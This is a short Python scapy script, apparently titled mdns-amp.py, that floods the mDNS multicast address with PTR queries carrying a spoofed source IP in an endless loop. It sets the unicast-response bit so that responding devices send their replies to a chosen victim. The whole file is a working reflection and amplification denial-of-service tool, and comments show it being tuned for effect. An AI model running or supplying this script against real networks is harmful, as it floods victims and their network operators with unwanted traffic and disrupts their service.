from scapy.all import *
import sys

if len(sys.argv) == 4:
    
    pkt=IP(dst="224.0.0.251",src=sys.argv[2],ttl=255)/UDP(dport=5353,sport=5353)/DNS(qd=DNSQR(qname=sys.argv[3],qtype='PTR',qclass=32769)) #32769 is 0x8001, because we want to set the top bit for unicast-response if possible
    #pkt=IP(dst="224.0.0.251",src=sys.argv[2],ttl=255)/UDP(dport=5353,sport=5353)/DNS(qd=DNSQR(qname=sys.argv[3],qtype='PTR',qclass=1))/b'\xFF' #The bit is the top bit, not after the class, read the RFC, David... (RTFRFC?)
    while True:
        try:
            send(pkt, verbose=False, iface=sys.argv[1]) #Keep sending the packet til they say to stop
        except KeyboardInterrupt:
            sys.exit(0)
else:
    print("Usage: python3 mdns-amp.py <interface> <target> <service>")


